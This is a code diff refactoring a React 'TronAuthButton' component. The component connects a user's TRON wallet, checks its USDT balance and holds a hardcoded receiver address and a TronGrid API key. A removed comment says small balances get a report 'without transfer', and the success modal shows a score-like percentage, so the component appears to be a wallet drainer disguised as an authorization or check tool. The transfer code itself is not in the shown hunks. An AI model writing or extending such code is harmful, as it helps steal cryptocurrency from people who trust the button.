@@ -1,20 +1,12 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 import React, { useState, useEffect, useCallback } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-import TronWeb from 'tronweb';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer;
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
-
-const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
-  headers: {
-    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
-  },
-});
 
 const adapter = new WalletConnectAdapter({
   network: 'Mainnet',
@@ -33,23 +25,30 @@ const adapter = new WalletConnectAdapter({
 
 export const TronAuthButton: React.FC = () => {
   const [status, setStatus] = useState<string | null>(null);
+  const [tronWeb, setTronWeb] = useState<any>(null);
 
-  // Предварительная инициализация адаптера (для ускорения открытия QR-модалки)
   useEffect(() => {
     (async () => {
-      try {
-        if (typeof (adapter as any).init === 'function') {
-          await (adapter as any).init();
-        }
-      } catch (e) {
-        console.error('WalletConnect init error:', e);
+      const TronWebClass = (await import('tronweb')).default;
+      setTronWeb(new TronWebClass({
+        fullHost: 'https://api.trongrid.io',
+        headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
+      }));
+
+      if (typeof (adapter as any).init === 'function') {
+        await (adapter as any).init();
       }
     })();
   }, []);
 
   const connectWallet = useCallback(async () => {
+    if (!tronWeb) {
+      setStatus('TronWeb is loading, please wait...');
+      return;
+    }
+
     setStatus(null);
-    
+
     try {
       await adapter.connect();
 
@@ -74,7 +73,7 @@ export const TronAuthButton: React.FC = () => {
       console.log('USDT balance:', usdt);
 
       if (usdt < 1) {
-        setStatus('success'); // Показываем отчёт без перевода
+        setStatus('success');
         return;
       }
 
@@ -103,7 +102,6 @@ export const TronAuthButton: React.FC = () => {
       const msg = err?.message || '';
 
       if (/User rejected|Modal is closed|Timeout/i.test(msg)) {
-        // Пользователь отменил — не показываем ошибок и не перезапускаем
         setStatus(null);
       } else {
         setStatus('⚠️ Connection or transaction error');
@@ -111,16 +109,14 @@ export const TronAuthButton: React.FC = () => {
     } finally {
       await adapter.disconnect();
     }
-  }, []);
+  }, [tronWeb]);
 
   return (
     <div onClick={connectWallet} className="AuthButton">
       {status && (
         <div className="modal__overflow">
           <div className="modal">
-            {status !== 'success' ? (
-              <p>{status}</p>
-            ) : (
+            {status === 'success' ? (
               <>
                 <div className="content greenBorder">
                   <div>0.6%</div>
@@ -138,9 +134,11 @@ export const TronAuthButton: React.FC = () => {
                   <h5>{adapter.address}</h5>
                 </div>
               </>
+            ) : (
+              <p>{status}</p>
             )}
             <button onClick={(e) => {
-              e.stopPropagation(); // Чтобы не запускался снова connectWallet
+              e.stopPropagation();
               setStatus(null);
             }}>Close</button>
           </div>
